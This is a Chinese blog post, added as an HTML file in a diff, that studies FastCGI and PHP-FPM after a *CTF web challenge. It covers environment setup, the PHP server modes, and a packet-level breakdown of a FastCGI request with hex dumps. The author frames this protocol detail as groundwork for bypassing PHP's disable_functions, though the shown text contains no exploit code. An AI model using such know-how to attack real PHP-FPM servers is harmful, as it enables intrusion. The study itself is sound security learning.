@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>FastCGI浅析 - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期一, 五月 6日 2019, 12:16 中午
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    5k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      23 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>同样是上周的 *CTF 的 Web 题目，题目用 PHP 仿写了函数调用栈，主要思路是栈溢出 + PHP-FPM 绕过 disable_functions，相关的 payload 脚本已经有前辈大师傅们写好了，因为我对 PHP 的几种模式了解得不是很清楚，所以研究学习一下，再写篇文章加以总结。</p>
+<span id="more"></span>
+
+<p><a href="https://bugs.php.net/bug.php?id=70134">https://bugs.php.net/bug.php?id=70134</a></p>
+<p><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
+<hr>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>为了方便研究，首先用 docker 搭个全新环境，使用的是 Ubuntu18 得镜像：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install software-properties-common</span><br><span class="line">add-apt-repository -y ppa:ondrej/php</span><br><span class="line">apt-get install php7.3 php7.3-fpm tzdata vim apache2 nginx tcpdump curl</span><br></pre></td></tr></table></figure>
+
+<p>使用 add-apt-repository 能方便地在 Ubuntu 下安装各种新版本的软件。修改 nginx 配置文件，跟 PHP-FPM 搭起来，也可以在上面的 index 配置中加上 index.php：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    include snippets/fastcgi-php.conf;</span><br><span class="line">    # With php-fpm (or other unix sockets):</span><br><span class="line">    # fastcgi_pass unix:/var/run/php/php7.3-fpm.sock;</span><br><span class="line">    # With php-cgi (or other tcp sockets):</span><br><span class="line">    fastcgi_pass 127.0.0.1:9000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同时修改 PHP-FPM 的配置文件 &#x2F;etc&#x2F;php&#x2F;7.3&#x2F;fpm&#x2F;pool.d&#x2F;<a href="http://www.conf,改为监听端口/">www.conf，改为监听端口</a> 9000，方便我们抓包进行观察。</p>
+<h3 id="mod-php、CGI、FastCGI、PHP-FPM"><a href="#mod-php、CGI、FastCGI、PHP-FPM" class="headerlink" title="mod_php、CGI、FastCGI、PHP-FPM"></a>mod_php、CGI、FastCGI、PHP-FPM</h3><p>文章：<a href="http://www.php.cn/php-weizijiaocheng-392861.html">http://www.php.cn/php-weizijiaocheng-392861.html</a></p>
+<h4 id="mod-php"><a href="#mod-php" class="headerlink" title="mod_php"></a>mod_php</h4><p>经常使用 Apache + PHP 的肯定对 mod_php 不陌生，在这种模式中，PHP 作为 Apache 中的一个模块存在：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule php7_module /usr/lib/apache2/modules/libphp7.3.so</span><br></pre></td></tr></table></figure>
+
+<p>而 php7.3.conf 中的配置如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">.</span>+\<span class="attr">.ph</span>(<span class="attr">ar</span>|<span class="attr">p</span>|<span class="attr">tml</span>)$&quot;&gt;</span></span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">.</span>+\<span class="attr">.phps</span>$&quot;&gt;</span></span><br><span class="line">    SetHandler application/x-httpd-php-source</span><br><span class="line">    # Deny access to raw php sources by default</span><br><span class="line">    # To re-enable it&#x27;s recommended to enable access to the files</span><br><span class="line">    # only in specific virtual host or directory</span><br><span class="line">    Require all denied</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"># Deny access to files without filename (e.g. &#x27;.php&#x27;)</span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;^\<span class="attr">.ph</span>(<span class="attr">ar</span>|<span class="attr">p</span>|<span class="attr">ps</span>|<span class="attr">tml</span>)$&quot;&gt;</span></span><br><span class="line">    Require all denied</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># Running PHP scripts in user directories is disabled by default</span><br><span class="line">#</span><br><span class="line"># To re-enable PHP in user directories comment the following lines</span><br><span class="line"># (from <span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">...</span>&gt;</span> to <span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span>.) Do NOT set it to On as it</span><br><span class="line"># prevents .htaccess files from disabling it.</span><br><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">mod_userdir.c</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Directory</span> /<span class="attr">home</span>/*/<span class="attr">public_html</span>&gt;</span></span><br><span class="line">        php_admin_flag engine Off</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以当我们向符合正则 .+.ph(ar|p|tml)$ 的文件发起 HTTP 请求的时候，Apache 就会把它作为 PHP 文件来处理，调用 php7_module 来进行解析并返回结果。PHP 模块再通过 SAPI 跟 PHP 进行数据交互：<a href="https://www.cnblogs.com/orlion/p/5157280.html">https://www.cnblogs.com/orlion/p/5157280.html</a> 。在 PHP 的源码中，当需要调用 Web 服务器相关信息时，全部通过 SAPI 接口中对应的方法调用实现，而这些方法在各个服务器抽象层实现时都会有各自的实现。通过 SAPI，PHP 就可以获得来自其他应用（比如 Apache）的数据。</p>
+<p>这种模式将 PHP 模块安装到 Apache 中，所以每一次 Apache 结束请求，都会产生一条进程，这个进程就完整的包括 PHP 的各种运算计算等操作。Apache 每接收一个请求，都会产生一个进程来连接 PHP 通过 SAPI 来完成请求，可想而知，如果一旦用户过多，并发数过多，服务器就会承受不住了。而且，把 mod_php 编进 Apache 时，出问题时很难定位是 PHP 的问题还是 Apache 的问题。</p>
+<h4 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h4><p>参考文章：<a href="https://www.cnblogs.com/wanghetao/p/3934350.html">https://www.cnblogs.com/wanghetao/p/3934350.html</a></p>
+<p>CGI 我用的不多，所以直接贴文章的内容了。</p>
+<p>CGI（Common Gateway Interface）全称是“通用网关接口”，WEB 服务器与 PHP 应用进行“交谈”的一种工具，其程序须运行在网络服务器上。CGI 可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。如 PHP、Perl 等。</p>
+<p>CGI 程序通过标准输入（STDIN）和标准输出（STDOUT）来进行输入输出。此外 CGI 程序还通过环境变量来得到输入，操作系统提供了许多环境变量，它们定义了程序的执行环境，应用程序可以存取它们。Web 服务器和 CGI 接口又另外设置了一些环境变量，用来向 CGI 程序传递一些重要的参数。CGI 的 GET 方法还通过环境变量 QUERY-STRING 向 CGI 程序传递 Form 中的数据。</p>
+<p>WEB服务器会传哪些数据给PHP解析器呢？URL、查询字符串、POST 数据、HTTP header 都会有。所以，CGI 就是规定要传哪些数据，以什么样的格式传递给后方处理这个请求的协议。</p>
+<p>也就是说，CGI 就是专门用来和 Web 服务器打交道的。Web 服务器收到用户请求，就会把请求提交给 CGI 程序（如 PHP-CGI ），CGI 程序根据请求提交的参数作应处理（解析 PHP ），然后输出标准的 HTML 语句，返回给 Web 服务器，Web 服务器再返回给客户端，这就是普通 CGI 的工作原理。</p>
+<p>CGI 的好处就是完全独立于任何服务器，仅仅是做为中间分子。提供接口给 Apache 和 PHP。他们通过 CGI 搭线来完成数据传递。这样做的好处了尽量减少2个的关联，使他们2变得更独立。</p>
+<p>但是 CGI 有个不好的地方，就是每一次 Web 请求都会有启动和退出过程，也就是最为人诟病的 fork-and-execute 模式，这样一在大规模并发下，就死翘翘了。</p>
+<h4 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h4><p>从根本上来说，FastCGI 是用来提高 CGI 程序性能的。类似于 CGI，FastCGI 也可以说是一种协议。</p>
+<p>FastCGI 像是一个常驻(long-live)型的 CGI，它可以一直执行着，只要激活后，不会每次都要花费时间去 fork 一次。它还支持分布式的运算, 即 FastCGI 程序可以在网站服务器以外的主机上执行，并且接受来自其它网站服务器来的请求。</p>
+<p>FastCGI 是语言无关的、可伸缩架构的 CGI 开放扩展，其主要行为是将 CGI 解释器进程保持在内存中，并因此获得较高的性能。众所周知，CGI 解释器的反复加载是 CGI 性能低下的主要原因，如果 CGI 解释器保持在内存中，并接受 FastCGI 进程管理器调度，则可以提供良好的性能、伸缩性、Fail-Over 特性等等。</p>
+<p>FastCGI 将 Web 服务器跟脚本解析完全分离，处理方式类似反向代理，Web 服务器负责将 HTTP 请求处理一遍之后，按照 FastCGI 协议的规范将请求转交给 FastCGI，然后等待 FastCGI 处理完毕后再将响应返回给客户端。这种方式可以让 HTTP 服务器专一地处理静态请求，或者将动态脚本服务器的结果返回给客户端，这在很大程度上提高了整个应用系统的性能。</p>
+<p>FastCGI 进程管理器自身初始化，启动多个 CGI 解释器进程(可建多个 php-cgi )，并等待来自 Web Server 的连接。</p>
+<p>当客户端请求到达 Web Server 时，FastCGI 进程管理器选择并连接到一个 CGI 解释器。Web server 将 CGI 环境变量和标准输入发送到 FastCGI 子进程 php-cgi。</p>
+<p>FastCGI 子进程完成处理后，将标准输出和错误信息从同一连接返回 Web Server。当 FastCGI 子进程关闭连接时，请求便告处理完成。FastCGI 子进程接着等待，并处理来自 FastCGI 进程管理器(运行在 Web Server 中)的下一个连接。</p>
+<p>因为 FastCGI 运行在内存中，所以它会消耗更多的服务器内存。</p>
+<h3 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h3><p>PHP-FPM 是 FastCGI 的一种具体实现：<a href="https://www.php.net/manual/zh/install.fpm.php">https://www.php.net/manual/zh/install.fpm.php</a></p>
+<p>主要有两种交互方式：TCP 和 Unix socket。</p>
+<p>Unix socket（Unix domain socket&#x2F;IPC）主要用于 Unix 系统中的进程间通信，它是全双工的，因为是本地通信，它仅仅复制数据，并不执行协议处理，不需要添加或删除网络报头，无需计算检验和，不要产生顺序号，无需发送确认报文。所以它的效率要高于网络 socket。熟悉 MySQL 的人就会联想到，在连接本地 MySQL 的时候经常使用的也是这种通信方式。</p>
+<hr>
+<h3 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h3><p>首先自己抓个包来玩玩：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i lo port 9000 -w fastcgi.pcap</span><br></pre></td></tr></table></figure>
+
+<p>然后写个 PHP 自己去访问一下，把抓到的包下载到本地打开，过滤一下只看请求包：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp.dstport==9000</span><br></pre></td></tr></table></figure>
+
+<p>可以看到一个 0x0000 协议的包，我们追踪 TCP 流看到请求内容。</p>
+<p>对 FastCGI 协议的分析可以看这几篇文章：</p>
+<p><a href="https://www.cnblogs.com/caiguoqing/p/4933085.html">https://www.cnblogs.com/caiguoqing/p/4933085.html</a></p>
+<p><a href="https://blog.csdn.net/shreck66/article/details/50355729">https://blog.csdn.net/shreck66/article/details/50355729</a></p>
+<p>大致上 record 头的结构如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="comment">/* Header */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> version; <span class="comment">// 版本</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> type; <span class="comment">// 本次record的类型</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> requestIdB1; <span class="comment">// 本次record对应的请求id</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> requestIdB0;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> contentLengthB1; <span class="comment">// body体的大小</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> contentLengthB0;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> paddingLength; <span class="comment">// 额外块大小</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> reserved; </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Body */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> contentData[contentLength];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure>
+
+<p>而几种常用的 type 的意思分别是：</p>
+<table>
+<thead>
+<tr>
+<th>type值</th>
+<th>具体含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>在与php-fpm建立连接之后发送的第一个消息中的type值就得为1，用来表明此消息为请求开始的第一个消息</td>
+</tr>
+<tr>
+<td>2</td>
+<td>异常断开与php-fpm的交互</td>
+</tr>
+<tr>
+<td>3</td>
+<td>在与php-fpm交互中所发的最后一个消息中type值为此，以表明交互的正常结束</td>
+</tr>
+<tr>
+<td>4</td>
+<td>在交互过程中给php-fpm传递环境参数时，将type设为此，以表明消息中包含的数据为某个name-value对</td>
+</tr>
+<tr>
+<td>5</td>
+<td>web服务器将从浏览器接收到的POST请求数据(表单提交等)以消息的形式发给php-fpm,这种消息的type就得设为5</td>
+</tr>
+<tr>
+<td>6</td>
+<td>php-fpm给web服务器回的正常响应消息的type就设为6</td>
+</tr>
+<tr>
+<td>7</td>
+<td>php-fpm给web服务器回的错误响应设为7</td>
+</tr>
+</tbody></table>
+<p>现在我们可以开始分析我们自己的包了，我的包如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">00000000  01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00   ........ ........</span><br><span class="line">00000010  01 04 00 01 03 80 00 00  09 00 50 41 54 48 5f 49   ........ ..PATH_I</span><br><span class="line">00000020  4e 46 4f 0f 17 53 43 52  49 50 54 5f 46 49 4c 45   NFO..SCR IPT_FILE</span><br><span class="line">00000030  4e 41 4d 45 2f 76 61 72  2f 77 77 77 2f 68 74 6d   NAME/var /www/htm</span><br><span class="line">00000040  6c 2f 69 6e 64 65 78 2e  70 68 70 0c 00 51 55 45   l/index. php..QUE</span><br><span class="line">00000050  52 59 5f 53 54 52 49 4e  47 0e 03 52 45 51 55 45   RY_STRIN G..REQUE</span><br><span class="line">00000060  53 54 5f 4d 45 54 48 4f  44 47 45 54 0c 00 43 4f   ST_METHO DGET..CO</span><br><span class="line">00000070  4e 54 45 4e 54 5f 54 59  50 45 0e 00 43 4f 4e 54   NTENT_TY PE..CONT</span><br><span class="line">00000080  45 4e 54 5f 4c 45 4e 47  54 48 0b 0a 53 43 52 49   ENT_LENG TH..SCRI</span><br><span class="line">00000090  50 54 5f 4e 41 4d 45 2f  69 6e 64 65 78 2e 70 68   PT_NAME/ index.ph</span><br><span class="line">000000A0  70 0b 0a 52 45 51 55 45  53 54 5f 55 52 49 2f 69   p..REQUE ST_URI/i</span><br><span class="line">000000B0  6e 64 65 78 2e 70 68 70  0c 0a 44 4f 43 55 4d 45   ndex.php ..DOCUME</span><br><span class="line">000000C0  4e 54 5f 55 52 49 2f 69  6e 64 65 78 2e 70 68 70   NT_URI/i ndex.php</span><br><span class="line">000000D0  0d 0d 44 4f 43 55 4d 45  4e 54 5f 52 4f 4f 54 2f   ..DOCUME NT_ROOT/</span><br><span class="line">000000E0  76 61 72 2f 77 77 77 2f  68 74 6d 6c 0f 08 53 45   var/www/ html..SE</span><br><span class="line">000000F0  52 56 45 52 5f 50 52 4f  54 4f 43 4f 4c 48 54 54   RVER_PRO TOCOLHTT</span><br><span class="line">00000100  50 2f 31 2e 31 0e 04 52  45 51 55 45 53 54 5f 53   P/1.1..R EQUEST_S</span><br><span class="line">00000110  43 48 45 4d 45 68 74 74  70 11 07 47 41 54 45 57   CHEMEhtt p..GATEW</span><br><span class="line">00000120  41 59 5f 49 4e 54 45 52  46 41 43 45 43 47 49 2f   AY_INTER FACECGI/</span><br><span class="line">00000130  31 2e 31 0f 0c 53 45 52  56 45 52 5f 53 4f 46 54   1.1..SER VER_SOFT</span><br><span class="line">00000140  57 41 52 45 6e 67 69 6e  78 2f 31 2e 31 34 2e 30   WAREngin x/1.14.0</span><br><span class="line">00000150  0b 0b 52 45 4d 4f 54 45  5f 41 44 44 52 ?? ?? 2e   ..REMOTE _ADDR??.</span><br><span class="line">00000160  ?? ?? 2e ?? ?? 2e ?? ??  0b 05 52 45 4d 4f 54 45   ??.??.?? ..REMOTE</span><br><span class="line">00000170  5f 50 4f 52 54 32 36 39  37 32 0b 0a 53 45 52 56   _PORT269 72..SERV</span><br><span class="line">00000180  45 52 5f 41 44 44 52 31  37 32 2e 31 37 2e 30 2e   ER_ADDR1 72.17.0.</span><br><span class="line">00000190  32 0b 02 53 45 52 56 45  52 5f 50 4f 52 54 38 30   2..SERVE R_PORT80</span><br><span class="line">000001A0  0b 01 53 45 52 56 45 52  5f 4e 41 4d 45 5f 0f 03   ..SERVER _NAME_..</span><br><span class="line">000001B0  52 45 44 49 52 45 43 54  5f 53 54 41 54 55 53 32   REDIRECT _STATUS2</span><br><span class="line">000001C0  30 30 09 15 48 54 54 50  5f 48 4f 53 54 ?? ?? ??   00..HTTP _HOST???</span><br><span class="line">000001D0  ?? ?? ?? ?? ?? ?? ?? ??  ?? 2e 63 6e 3a 33 32 37   ???????? ?.cn:327</span><br><span class="line">000001E0  37 30 0f 0a 48 54 54 50  5f 43 4f 4e 4e 45 43 54   70..HTTP _CONNECT</span><br><span class="line">000001F0  49 4f 4e 6b 65 65 70 2d  61 6c 69 76 65 0b 08 48   IONkeep- alive..H</span><br><span class="line">00000200  54 54 50 5f 50 52 41 47  4d 41 6e 6f 2d 63 61 63   TTP_PRAG MAno-cac</span><br><span class="line">00000210  68 65 12 08 48 54 54 50  5f 43 41 43 48 45 5f 43   he..HTTP _CACHE_C</span><br><span class="line">00000220  4f 4e 54 52 4f 4c 6e 6f  2d 63 61 63 68 65 1e 01   ONTROLno -cache..</span><br><span class="line">00000230  48 54 54 50 5f 55 50 47  52 41 44 45 5f 49 4e 53   HTTP_UPG RADE_INS</span><br><span class="line">00000240  45 43 55 52 45 5f 52 45  51 55 45 53 54 53 31 0f   ECURE_RE QUESTS1.</span><br><span class="line">00000250  6e 48 54 54 50 5f 55 53  45 52 5f 41 47 45 4e 54   nHTTP_US ER_AGENT</span><br><span class="line">00000260  4d 6f 7a 69 6c 6c 61 2f  35 2e 30 20 28 57 69 6e   Mozilla/ 5.0 (Win</span><br><span class="line">00000270  64 6f 77 73 20 4e 54 20  31 30 2e 30 3b 20 57 4f   dows NT  10.0; WO</span><br><span class="line">00000280  57 36 34 29 20 41 70 70  6c 65 57 65 62 4b 69 74   W64) App leWebKit</span><br><span class="line">00000290  2f 35 33 37 2e 33 36 20  28 4b 48 54 4d 4c 2c 20   /537.36  (KHTML, </span><br><span class="line">000002A0  6c 69 6b 65 20 47 65 63  6b 6f 29 20 43 68 72 6f   like Gec ko) Chro</span><br><span class="line">000002B0  6d 65 2f 37 33 2e 30 2e  33 36 38 33 2e 31 30 33   me/73.0. 3683.103</span><br><span class="line">000002C0  20 53 61 66 61 72 69 2f  35 33 37 2e 33 36 0b 76    Safari/ 537.36.v</span><br><span class="line">000002D0  48 54 54 50 5f 41 43 43  45 50 54 74 65 78 74 2f   HTTP_ACC EPTtext/</span><br><span class="line">000002E0  68 74 6d 6c 2c 61 70 70  6c 69 63 61 74 69 6f 6e   html,app lication</span><br><span class="line">000002F0  2f 78 68 74 6d 6c 2b 78  6d 6c 2c 61 70 70 6c 69   /xhtml+x ml,appli</span><br><span class="line">00000300  63 61 74 69 6f 6e 2f 78  6d 6c 3b 71 3d 30 2e 39   cation/x ml;q=0.9</span><br><span class="line">00000310  2c 69 6d 61 67 65 2f 77  65 62 70 2c 69 6d 61 67   ,image/w ebp,imag</span><br><span class="line">00000320  65 2f 61 70 6e 67 2c 2a  2f 2a 3b 71 3d 30 2e 38   e/apng,* /*;q=0.8</span><br><span class="line">00000330  2c 61 70 70 6c 69 63 61  74 69 6f 6e 2f 73 69 67   ,applica tion/sig</span><br><span class="line">00000340  6e 65 64 2d 65 78 63 68  61 6e 67 65 3b 76 3d 62   ned-exch ange;v=b</span><br><span class="line">00000350  33 14 0d 48 54 54 50 5f  41 43 43 45 50 54 5f 45   3..HTTP_ ACCEPT_E</span><br><span class="line">00000360  4e 43 4f 44 49 4e 47 67  7a 69 70 2c 20 64 65 66   NCODINGg zip, def</span><br><span class="line">00000370  6c 61 74 65 14 0e 48 54  54 50 5f 41 43 43 45 50   late..HT TP_ACCEP</span><br><span class="line">00000380  54 5f 4c 41 4e 47 55 41  47 45 7a 68 2d 43 4e 2c   T_LANGUA GEzh-CN,</span><br><span class="line">00000390  7a 68 3b 71 3d 30 2e 39  01 04 00 01 00 00 00 00   zh;q=0.9 ........</span><br><span class="line">000003A0  01 05 00 01 00 00 00 00                            ........ </span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到这里有很多在 PHP 的 SERVER 全局变量中很眼熟的参数，我们将它进行拆分，第一个包为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>其中前 8 位位 FastCGI record 的头，它的意思即：</p>
+<ul>
+<li>version 为 01</li>
+<li>type 为 01，表示这是第一个包</li>
+<li>00 01 表示通信 ID 为 1</li>
+<li>00 08 表示 body 大小为8</li>
+<li>00 00 表示 padding 长度为 0，没有保留字节</li>
+</ul>
+<p>后 8 位则是 body，它的意思是：</p>
+<ul>
+<li><p>00 01 为 role，表示 PHP-FPM 接受我们的 HTTP 所关联的信息，并产生个响应<br>role 的取值如下表：</p>
+<table>
+<thead>
+<tr>
+<th>role值</th>
+<th>具体含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>最常用的值，php-fpm接受我们的http所关联的信息，并产生个响应</td>
+</tr>
+<tr>
+<td>2</td>
+<td>php-fpm会对我们的请求进行认证，认证通过的其会返回响应，认证不通过则关闭请求</td>
+</tr>
+<tr>
+<td>3</td>
+<td>过滤请求中的额外数据流，并产生过滤后的http响应</td>
+</tr>
+</tbody></table>
